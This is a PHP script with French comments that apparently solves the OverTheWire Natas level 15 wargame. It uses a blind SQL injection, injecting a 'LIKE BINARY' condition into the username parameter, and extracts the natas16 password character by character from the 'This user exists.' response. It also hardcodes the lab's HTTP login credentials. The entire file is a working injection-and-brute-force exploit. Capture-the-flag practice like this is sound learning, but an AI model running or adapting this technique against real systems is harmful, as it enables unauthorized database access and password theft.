<?php
// Base URL du challenge
$base_url = "http://natas15.natas.labs.overthewire.org/";
// Nom d'utilisateur pour l'injection SQL
$username = "natas16\"";

// Caractères à tester
$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$password = "";

// Initialisation de cURL
$ch = curl_init();

// Configuration de cURL pour l'authentification
curl_setopt($ch, CURLOPT_USERPWD, "natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Test de chaque caractère
for ($i = 0; $i < 64; $i++) {
    foreach (str_split($characters) as $char) {
        echo "Testing character: $char\n";
        $query = $username . " and password LIKE BINARY \"" . $password . $char . "%\";#";
        $url = $base_url . "?username=" . urlencode($query) . "&debug";
        
        // Envoi de la requête
        curl_setopt($ch, CURLOPT_URL, $url);
        $result = curl_exec($ch);

        // Vérification de la réponse
        if (strpos($result, "This user exists.") !== false) {
            $password .= $char;
            echo "Password found so far: " . $password . "\n";
            break;
        }
    }
}

// Fermeture de la session cURL
curl_close($ch);

echo "Final password: " . $password . "\n";
?>
